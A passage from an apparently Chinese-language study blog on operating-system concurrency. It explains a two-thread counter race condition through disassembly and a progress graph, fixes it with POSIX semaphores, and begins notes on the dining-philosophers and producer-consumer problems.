class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(cnt!=(<span class="number">2</span>*niters))&#123;<span class="comment">//检查此时cnt的值是否等于二倍的niters</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cnt=%ld,What happened?\n&quot;</span>,cnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nothing happened.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在单核ubuntu虚拟机上的运行结果</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220530223552070.png"
alt="image-20220530223552070" />
<figcaption aria-hidden="true">image-20220530223552070</figcaption>
</figure>
<p>指定命令行参数为1e8则期望的cnt应该被两个线程轮流增加直到2e8,但是实际上cnt=142026321或者153306108甚至两次执行结果都不一样</p>
<p>为什么会发生这种事情呢?</p>
<p>反汇编观察<code>func</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:080484B0                 assume cs:_text</span><br><span class="line">.text:080484B0                 ;org 80484B0h</span><br><span class="line">.text:080484B0                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br><span class="line">;注意ds段寄存器指向.data全局变量节,cnt就在这里</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.text:08048564 ; Attributes: bp-based frame</span><br><span class="line">.text:08048564</span><br><span class="line">.text:08048564 ; void *func(void *)</span><br><span class="line">.text:08048564                 public func</span><br><span class="line">.text:08048564 func            proc near               ; DATA XREF: main+43↓o</span><br><span class="line">.text:08048564                                         ; main+67↓o</span><br><span class="line">.text:08048564</span><br><span class="line">.text:08048564 var_8           = dword ptr -8</span><br><span class="line">.text:08048564 var_4           = dword ptr -4</span><br><span class="line">.text:08048564 arg_0           = dword ptr  8</span><br><span class="line">.text:08048564</span><br><span class="line">.text:08048564                 push    ebp</span><br><span class="line">.text:08048565                 mov     ebp, esp</span><br><span class="line">.text:08048567                 sub     esp, 10h</span><br><span class="line">.text:0804856A                 mov     eax, [ebp+arg_0] ; 参数vargp的地址放到eax寄存器</span><br><span class="line">.text:0804856D                 mov     eax, [eax]      ; 参数vargp的值放到eax寄存器</span><br><span class="line">.text:0804856F                 mov     [ebp+var_4], eax ; vargp-&gt;var_4</span><br><span class="line">.text:08048572                 mov     [ebp+var_8], 0  ; 0-&gt;var_8,可以猜测对应long i=0,循环变量</span><br><span class="line">.text:08048579                 jmp     short loc_804858C ; &quot;跳进循环&quot;</span><br><span class="line">.text:0804857B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0804857B</span><br><span class="line">.text:0804857B loc_804857B:                            ; CODE XREF: func+2E↓j</span><br><span class="line">.text:0804857B                 mov     eax, ds:cnt     ; 三句话,让位于ds段的cnt加个1</span><br><span class="line">.text:08048580                 add     eax, 1</span><br><span class="line">.text:08048583                 mov     ds:cnt, eax</span><br><span class="line">.text:08048588                 add     [ebp+var_8], 1  ; 循环变量加1</span><br><span class="line">.text:0804858C</span><br><span class="line">.text:0804858C loc_804858C:                            ; CODE XREF: func+15↑j</span><br><span class="line">.text:0804858C                 mov     eax, [ebp+var_8] ; 循环变量var_8值放到eax寄存器</span><br><span class="line">.text:0804858F                 cmp     eax, [ebp+var_4] ; 循环变量值与var_4中存放的vargp的值进行比较</span><br><span class="line">.text:08048592                 jl      short loc_804857B ; 如果var_8&lt;var_4即i&lt;vargp则重复循环</span><br><span class="line">.text:08048594                 mov     eax, 0</span><br><span class="line">.text:08048599                 leave</span><br><span class="line">.text:0804859A                 retn</span><br><span class="line">.text:0804859A func            endp</span><br></pre></td></tr></table></figure>
<p>注意这迷人的三句话<del>让男人给我花了十八万</del></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0804857B                 mov     eax, ds:cnt     ; 三句话,让位于ds段的cnt加个1</span><br><span class="line">.text:08048580                 add     eax, 1</span><br><span class="line">.text:08048583                 mov     ds:cnt, eax</span><br></pre></td></tr></table></figure>
<p>假设,现在cnt=10,</p>
<p>线程1执行了<code>.text:0804857B                 mov     eax, ds:cnt</code>之后歇逼了(时间片用完了,发生调度,属于概率事件),保存好线程上下文(包括eax寄存器,保存的eax值为eax=10),然后控制交给线程2</p>
<p>线程2也执行了<code>.text:0804857B                 mov     eax, ds:cnt</code>,之后线程2没有歇逼,又执行完了下面两句话,把三句话说全了,然后歇逼,控制交给线程1</p>
<p>此时cnt=11</p>
<p>线程1恢复了上下文,<code>eax=10</code>,然后执行剩下的两句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048580                 add     eax, 1		;eax=11</span><br><span class="line">.text:08048583                 mov     ds:cnt, eax	;eax=11-&gt;cnt</span><br></pre></td></tr></table></figure>
<p>执行完了之后发现cnt=11</p>
<p>刚才已经等于11了,这一波操作之后还是11,相当于线程1啥也没干,失去一次增加cnt的机会</p>
<p>如果线程1完全执行完了才执行线程2,自然不会有上述错误</p>
<p>发生错误的原因是,两个线程有机会同时访问修改共享变量(一个躺在共享变量上睡觉,另一个修改共享变量)</p>
<p>那么解决方法也是显然的,<strong>让共享变量某一时刻只能被一个线程访问.</strong></p>
<p>这种可能被多个线程访问的共享变量叫做"<strong>临界区</strong>",怎样解决单处理机上的同步错误呢?使用信号量</p>
<h3 id="进程图">进程图</h3>
<p>刚才发生的同步错误,用进程图描述更加直观</p>
<p><code>func</code>干的事情可以描述为这么几部分:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">临界区前	Hi</span><br><span class="line">临界区开始	</span><br><span class="line">	加载cnt到eax	Li</span><br><span class="line">	eax+<span class="number">1</span>-&gt;eax	 Ui</span><br><span class="line">	eax写回cnt	Si</span><br><span class="line">临界区结束</span><br><span class="line">临界区后	Ti</span><br></pre></td></tr></table></figure>
<p>分别编上号,角标<code>i</code>表示线程<code>i</code></p>
<p>那么一个线程的执行过程可以用数轴表示,正方向表示时间推移</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220530230823320.png"
alt="image-20220530230823320" />
<figcaption aria-hidden="true">image-20220530230823320</figcaption>
</figure>
<p>那么两个线程并发执行过程可以用二维坐标系表示,x轴和y轴各表示一个线程的时间轴</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220530230930124.png"
alt="image-20220530230930124" />
<figcaption aria-hidden="true">image-20220530230930124</figcaption>
</figure>
<p>其中节点均表示两个线程完成某些步骤之后的状态,线段表示状态转移</p>
<p>在临界区中的状态标记为危险区</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220530233515036.png"
alt="image-20220530233515036" />
<figcaption aria-hidden="true">image-20220530233515036</figcaption>
</figure>
<blockquote>
<p>危险区的意思是,两个线程同时访问临界区</p>
</blockquote>
<p>要状态转移到终点位置并且不能经过危险区,贴着危险区的边走也是可以的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220530234418812.png"
alt="image-20220530234418812" />
<figcaption aria-hidden="true">image-20220530234418812</figcaption>
</figure>
<h2 id="信号量">信号量</h2>
<p><code>semaphore</code></p>
<p>信号量是非负整数值的全局变量,只能由两种特殊操作来处理,P(proberen测试)操作和V(verhogen增加)操作</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220531000855604.png"
alt="image-20220531000855604" />
<figcaption aria-hidden="true">image-20220531000855604</figcaption>
</figure>
<p>P和V中的操作都是一条龙,不允许中断</p>
<p>P和V保证信号量是一个非负值,这个性质叫做"信号量不变性"</p>
<h3 id="posix接口">Posix接口</h3>
<h4 id="sem_t"><code>sem_t</code></h4>
<p>信号量的定义</p>
<p><code>/bits/semaphore.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __SIZEOF_SEM_T	32</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> __size[__SIZEOF_SEM_T];</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> __align;</span><br><span class="line">&#125; <span class="type">sem_t</span>;</span><br></pre></td></tr></table></figure>
<p><code>sem_t</code>是一个32字节的字符数组和长整型的联合体</p>
<h4 id="初始化信号量sem_init">初始化信号量<code>sem_init</code></h4>
<p><code>semaphore.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Initialize semaphore object SEM to VALUE.  If PSHARED then share it</span></span><br><span class="line"><span class="comment">   with other processes.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">sem_init</span> <span class="params">(<span class="type">sem_t</span> *__sem, <span class="type">int</span> __pshared, <span class="type">unsigned</span> <span class="type">int</span> __value)</span></span><br><span class="line">     __THROW;</span><br></pre></td></tr></table></figure>
<p>信号量以指针<code>sem_t *__sem</code>传参,</p>
<p><code>int __pshared</code>总是0,</p>
<p><code>unsigend int __value</code>表示信号量的初始值(最大值)</p>
<h4
id="pv操作sem_waitsem_post">PV操作<code>sem_wait&amp;sem_post</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Wait for SEM being posted.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This function is a cancellation point and therefore not marked with</span></span><br><span class="line"><span class="comment">   __THROW.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">sem_wait</span> <span class="params">(<span class="type">sem_t</span> *__sem)</span>;</span><br><span class="line"><span class="comment">/* Post SEM.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">sem_post</span> <span class="params">(<span class="type">sem_t</span> *__sem)</span> __THROW;</span><br></pre></td></tr></table></figure>
<p>其中</p>
<p><code>sem_wait</code>相当于<code>P</code>操作</p>
<p><code>sem_post</code>相当于<code>V</code>操作</p>
<h3 id="信号量实现互斥">信号量实现互斥</h3>
<h4 id="信号量互斥锁的区别">信号量,互斥锁的区别</h4>
<p>每个共享变量与一个信号量s联系起来,当线程访问共享变量时,用<code>sem_wait(&amp;s)</code>和<code>sem_post(&amp;s)</code>包裹访问临界区的操作.</p>
<p>如果这样用信号量则s的值要么是0(表示临界区没有被访问)要么是1(表示已经有线程在临界区中睡觉或者执行了)</p>
<p>由于s的值只有两种因此s又叫做"<strong>二元信号量binary
semaphore</strong>"</p>
<p>用于临界区互斥的二元信号量叫做"<strong>互斥锁mutex</strong>"</p>
<p>信号量还可以统计资源数量</p>
<p>比如某种设备有8个,就用s=8表示该种资源的最大值,这种用法的信号量叫做"<strong>计数信号量</strong>"</p>
<h4 id="信号量解决同步错误">信号量解决同步错误</h4>
<p>还是同步错误时的例子,用信号量应该这样修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="type">sem_t</span> mutex;<span class="comment">//声明一个信号量,名字叫做mutex显然作为互斥锁使用</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">func</span><span class="params">(<span class="type">void</span> *vargp)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> niters=*((<span class="type">long</span>*)vargp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">long</span> i=<span class="number">0</span>;i&lt;niters;++i)&#123;</span><br><span class="line">        sem_wait(&amp;mutex);<span class="comment">//进入临界区之前首先访问并修改互斥锁</span></span><br><span class="line">        cnt++;<span class="comment">//访问临界区操作</span></span><br><span class="line">        sem_post(&amp;mutex);<span class="comment">//离开临界区之后立刻还原互斥锁</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    sem_init(&amp;mutex,<span class="number">0</span>,<span class="number">1</span>);<span class="comment">//注册一个最大值为1的信号量即互斥锁</span></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> niters;</span><br><span class="line">    <span class="type">pthread_t</span> tid1,tid2;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;expect a number as argument\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    niters=atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    pthread_create(&amp;tid1,<span class="literal">NULL</span>,func,&amp;niters);</span><br><span class="line">    pthread_create(&amp;tid2,<span class="literal">NULL</span>,func,&amp;niters);</span><br><span class="line">    pthread_join(tid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(cnt!=(<span class="number">2</span>*niters))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cnt=%ld,What happened?\n&quot;</span>,cnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nothing happened.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键步骤</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;mutex);<span class="comment">//进入临界区之前首先访问并修改互斥锁</span></span><br><span class="line">cnt++;<span class="comment">//访问临界区操作</span></span><br><span class="line">sem_post(&amp;mutex);<span class="comment">//离开临界区之后立刻还原互斥锁</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>举个例子推导互斥锁的工作原理</p>
<p>假设线程1在访问临界区cnt时睡觉了,此时线程1已经执行过<code>sem_wait(&amp;mutex)</code>,这是<strong>一个一条龙操作</strong>,即保证一旦线程1开始执行<code>sem_wait(&amp;mutex)</code>则线程1对cpu的控制至少要持续到该操作结束.</p>
<p><code>sem_wait(&amp;mutex)</code>之后,mutex=0,表征当前临界区中已有线程访问.</p>
<p>那么线程2会在<code>sem_wait(&amp;mutex)</code>这一步等待,直到线程1释放互斥锁</p>
</blockquote>
<p>在单处理器机器(虚拟机给一个只有一个核的处理器)上的运行结果:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220531005828633.png"
alt="image-20220531005828633" />
<figcaption aria-hidden="true">image-20220531005828633</figcaption>
</figure>
<p>治好了老咳喘</p>
<h4
id="使用信号量互斥锁之后的进程图">使用信号量(互斥锁)之后的进程图</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220531005043807.png"
alt="image-20220531005043807" />
<figcaption aria-hidden="true">image-20220531005043807</figcaption>
</figure>
<p>刚才我们分析过,贴着不安全区的边也是可以的,但是使用信号量解决互斥问题时,贴着不安全区的边也不行.因为临界区中的状态点处互斥锁值为-1,表示两个线程都获得了互斥锁,这意味着</p>
<p><code>sem_wait(&amp;mutex)</code>可以被两个线程"同时"执行,</p>
<p>这意味着其中一个线程首先执行<code>sem_wait(&amp;mutex)</code>到一半的时候睡觉了,轮到另一个线程执行<code>sem_wait(&amp;mutex)</code></p>
<p>而<code>sem_wait(&amp;mutex)</code>被实现为一个不可中断的一条龙操作</p>
<p>因此不可能出现<code>mutex=-1</code>的情况</p>
<h2 id="经典ipc问题">经典IPC问题</h2>
<h3 id="哲学家就餐问题还没想明白">哲学家就餐问题(还没想明白)</h3>
<blockquote>
<p>要我说,都饿死才好,thus我就不用考一个67分的马原儿了</p>
</blockquote>
<p>说了这么一个事情</p>
<p>五个憨批哲学家在一起吃面条子,圆桌子上只有五根儿筷子.人要吃饭的时候要用两根筷子.人不吃饭的时候要么在胡思乱想,要么在挨饿.</p>
<p>哲学家的三种状态:</p>
<p>1.进食,正在占用左右的筷子</p>
<p>2.思考,进食完毕之后立刻放下筷子,思考,思考状态不需要进食</p>
<p>3.饥饿,思考完毕之后立刻进入饥饿状态,一旦条件允许应立刻进食</p>
<p>哲学家会做的事情:</p>
<p>1.首先思考</p>
<p>2.获得桌面控制权<code>mutex</code>锁,这个控制权某时刻只允许做多由一个人掌控.如果获得不了则在<code>mutex</code>的等待队列挂着.</p>
<blockquote>
<p>这里mutex的作用是只允许某时刻桌子上有一个人放下或者拿起筷子</p>
</blockquote>
<p>3.获得<code>mutex</code>之后,立刻设置自己为饥饿状态</p>
<p>4.检查左右是否有人在吃饭,如果有则自己不能吃.否则设置自己的状态为进食,并且给</p>
<p>不管有没有吃到饭,检查一次就立刻放开<code>mutex</code>锁</p>
<p>5.如果第4步</p>
<p>2.然后设置自己为饥饿状态</p>
<p>3.检查左右是否有人进食,如果有则说明自己的筷子不够,保持饥饿状态,放权</p>
<ol start="4" type="1">
<li></li>
</ol>
<p>怎么安排让吃饭不打架并且让效率最高呢?</p>
<blockquote>
<p>假算法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N 5</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">philosopher</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		think();</span><br><span class="line">		take_fork(i);<span class="comment">//线程不安全的take_fork函数</span></span><br><span class="line">		take_fork((i+<span class="number">1</span>)%N);</span><br><span class="line">		eat();</span><br><span class="line">		put_fork(i);</span><br><span class="line">		put_fork((i+<span class="number">1</span>)%N);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显然是存在同步问题的,三号线程执行<code>take_fork(3)</code>和二号线程执行<code>take_fork(3)</code>是存在线程同步问题的.有可能被同时执行,这就相当于一根筷子被两个人拿着</p>
<p>改进</p>
<p>方便安排期间,整个桌子看成一个大临界区,某一时刻只允许一个哲学家进食.用一个互斥锁<code>mutex</code>就可以实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">philosopher</span><span class="params">(<span class="type">void</span>*para)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=*(<span class="type">int</span>*)para;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		think();</span><br><span class="line">        sem_wait(&amp;mutex);<span class="comment">//桌子上锁</span></span><br><span class="line">		eat();</span><br><span class="line">        sem_post(&amp;mutex);<span class="comment">//桌子下锁</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可是这时候桌子上无根筷子的拜访就没有意义了,反正只允许一个哲学家进食,他想用哪根就用哪根</p>
<p>这样可以保证不打架,但是实际上5根筷子最多允许同一时刻两个哲学家进食,因此这种方法的并行性并不好</p>
</blockquote>
<h3 id="生产者消费者问题">生产者消费者问题</h3>
<p>生产者线程和消费者线程共享一个n个槽的有限缓冲区,生产者反复产生新的项目并将其插入缓冲区中.</p>
<p>消费者不断从缓冲区按照FIFO规则取出这些项目,然后消费之</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220531080219711.png"
alt="image-20220531080219711" />
<figcaption aria-hidden="true">image-20220531080219711</figcaption>
</figure>
<p>缓冲区用一个大小为<code>n</code>的<code>int</code>型队列表示,每个int表示一个空槽</p>
<p>那么可以实现一个队列,<code>push</code>相当于生产者动作,<code>pop</code>是消费者动作.用信号量保证互斥问题</p>
<h4 id="缓冲区数据结构">缓冲区数据结构</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> QUEUE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUEUE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> *buf;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> front;</span><br><span class="line">    <span class="type">int</span> rear;</span><br><span class="line">&#125;Queue;		<span class="comment">//普通队列,不同步</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">queue_init</span><span class="params">(Queue*,<span class="type">int</span>)</span>;<span class="comment">//初始化一个队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">queue_destroy</span><span class="params">(Queue*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">(Queue*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">full</span><span class="params">(Queue*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(Queue*,<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pop</span><span class="params">(Queue*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(Queue*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Queue <span class="built_in">queue</span>;<span class="comment">//临界区</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;<span class="comment">//临界区互斥锁</span></span><br><span class="line">    <span class="type">sem_t</span> cnt_used;<span class="comment">//已使用槽数</span></span><br><span class="line">    <span class="type">sem_t</span> cnt_unused;<span class="comment">//空槽数</span></span><br><span class="line">&#125;Safe_Queue;<span class="comment">//同步队列,封装了一个成员对象Queue queue</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">safe_init</span><span class="params">(Safe_Queue*,<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">safe_destory</span><span class="params">(Safe_Queue*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">safe_empty</span><span class="params">(Safe_Queue*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">safe_full</span><span class="params">(Safe_Queue*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">safe_push</span><span class="params">(Safe_Queue*,<span class="type">int</span> x)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">safe_pop</span><span class="params">(Safe_Queue*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">safe_length</span><span class="params">(Safe_Queue*)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h4 id="函数实现">函数实现</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 